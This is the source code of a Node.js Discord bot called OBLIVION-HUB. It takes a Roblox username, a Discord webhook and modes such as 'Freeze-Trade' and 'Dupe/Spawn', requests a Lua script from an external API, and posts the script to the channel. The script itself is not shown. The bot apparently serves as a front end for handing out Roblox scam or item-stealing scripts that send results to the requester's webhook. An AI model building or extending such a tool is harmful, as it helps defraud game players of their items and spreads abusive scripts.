const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } = require('discord.js');
const express = require('express');
const fetch = require('node-fetch');

// ============================================================
//  CONFIGURACIÓN DE ENTORNO
// ============================================================
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;
const API_URL = process.env.API_URL || 'https://oblivionhub.xyz';

// ============================================================
//  CLIENTE DE DISCORD
// ============================================================
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ============================================================
//  DEFINICIÓN DE COMANDOS SLASH
// ============================================================
const commands = [
    // Comando principal: generate
    new SlashCommandBuilder()
        .setName('generate')
        .setDescription('Genera un script de OBLIVION con tus selecciones')
        .addStringOption(option =>
            option.setName('username')
                .setDescription('Tu Roblox username')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('webhook')
                .setDescription('Tu Discord webhook (opcional)')
                .setRequired(false))
        .addStringOption(option =>
            option.setName('mode')
                .setDescription('Modo de ejecución')
                .setRequired(false)
                .addChoices(
                    { name: 'Normal', value: 'normal' },
                    { name: 'Admin Panel', value: 'adminpanel' },
                    { name: 'Freeze-Trade', value: 'freezetrade' },
                    { name: 'Dupe/Spawn', value: 'dupespawn' },
                    { name: 'Custom', value: 'custom' }
                ))
        .addStringOption(option =>
            option.setName('brainrots')
                .setDescription('Brainrots seleccionados (separados por coma)')
                .setRequired(false))
        .addStringOption(option =>
            option.setName('skins')
                .setDescription('Skins seleccionadas (separadas por coma)')
                .setRequired(false))
        .addStringOption(option =>
            option.setName('gears')
                .setDescription('Gears seleccionados (separados por coma)')
                .setRequired(false))
        .addStringOption(option =>
            option.setName('custom_code')
                .setDescription('Código personalizado (solo si modo Custom)')
                .setRequired(false)),

    // Comando de ayuda
    new SlashCommandBuilder()
        .setName('help')
        .setDescription('Muestra la ayuda de OBLIVION-HUB'),

    // Comando para guardar webhook
    new SlashCommandBuilder()
        .setName('webhook')
        .setDescription('Guarda tu webhook para usarlo siempre')
        .addStringOption(option =>
            option.setName('url')
                .setDescription('URL del webhook de Discord')
                .setRequired(true))
];

// ============================================================
//  REGISTRO DE COMANDOS
// ============================================================
const rest = new REST({ version: '10' }).setToken(TOKEN);

client.once('ready', async () => {
    console.log(`✅ Bot conectado como ${client.user.tag}`);
    try {
        await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), {
            body: commands.map(cmd => cmd.toJSON())
        });
        console.log('✅ Comandos registrados correctamente en el servidor.');
    } catch (error) {
        console.error('❌ Error registrando comandos:', error);
    }
});

// ============================================================
//  MANEJADOR DE INTERACCIONES
// ============================================================
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, user, options } = interaction;

    // ---- HELP ----
    if (commandName === 'help') {
        await interaction.reply({
            content: `🤖 **OBLIVION-HUB Bot**\n\n` +
                    `**Comandos disponibles:**\n` +
                    `\`/generate\` - Genera un script con tus selecciones\n` +
                    `\`/webhook\` - Guarda tu webhook para usarlo siempre\n` +
                    `\`/help\` - Muestra esta ayuda\n\n` +
                    `📌 **Ejemplo de uso:**\n` +
                    `/generate username:cxior0 mode:normal brainrots:Headless Horseman,Meowl`,
            ephemeral: true
        });
        return;
    }

    // ---- WEBHOOK ----
    if (commandName === 'webhook') {
        const url = options.getString('url');
        // Guardar webhook en memoria (para pruebas) o en base de datos
        // Por ahora, lo guardamos en un Map global
        if (!client.userWebhooks) {
            client.userWebhooks = new Map();
        }
        client.userWebhooks.set(user.id, url);
        await interaction.reply({
            content: `✅ Webhook guardado correctamente. Ahora puedes usar \`/generate\` sin especificar webhook.`,
            ephemeral: true
        });
        return;
    }

    // ---- GENERATE ----
    if (commandName === 'generate') {
        await interaction.deferReply({ ephemeral: false });

        try {
            // Obtener parámetros
            const username = options.getString('username');
            let webhook = options.getString('webhook') || '';
            const mode = options.getString('mode') || 'normal';
            const brainrots = options.getString('brainrots')?.split(',').map(s => s.trim()).filter(Boolean) || [];
            const skins = options.getString('skins')?.split(',').map(s => s.trim()).filter(Boolean) || [];
            const gears = options.getString('gears')?.split(',').map(s => s.trim()).filter(Boolean) || [];
            const customCode = options.getString('custom_code') || '';

            // Si no se proporcionó webhook, intentar obtener el guardado
            if (!webhook && client.userWebhooks?.has(user.id)) {
                webhook = client.userWebhooks.get(user.id);
            }

            // Llamar a la API de Vercel
            const response = await fetch(`${API_URL}/api/generate`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username,
                    webhook,
                    mode,
                    brainrots,
                    skins,
                    gears,
                    customCode,
                    shortEnabled: false
                })
            });

            const data = await response.json();

            if (!response.ok) {
                throw new Error(data.error || 'Error en la API');
            }

            const script = data.script || 'No se pudo generar el script.';

            // Enviar el script (manejar scripts largos)
            if (script.length > 1900) {
                const parts = script.match(/[\s\S]{1,1900}/g) || [];
                await interaction.editReply(`📄 **Script generado para ${username}** (muy largo, enviado en partes):`);
                for (const part of parts) {
                    await interaction.followUp({ content: `\`\`\`lua\n${part}\n\`\`\`` });
                }
            } else {
                await interaction.editReply({
                    content: `📄 **Script generado para ${username}**\n\`\`\`lua\n${script}\n\`\`\``
                });
            }

        } catch (error) {
            await interaction.editReply({ content: `❌ Error al generar el script: ${error.message}` });
        }
        return;
    }
});

// ============================================================
//  INICIAR EL BOT
// ============================================================
client.login(TOKEN);

// ============================================================
//  SERVIDOR HTTP PARA MANTENER EL WEB SERVICE ACTIVO
// ============================================================
const app = express();
const port = process.env.PORT || 10000;

app.get('/', (req, res) => {
    res.send('🤖 OBLIVION-HUB Bot está funcionando correctamente.');
});

app.listen(port, '0.0.0.0', () => {
    console.log(`✅ Servidor HTTP escuchando en el puerto ${port}`);
});
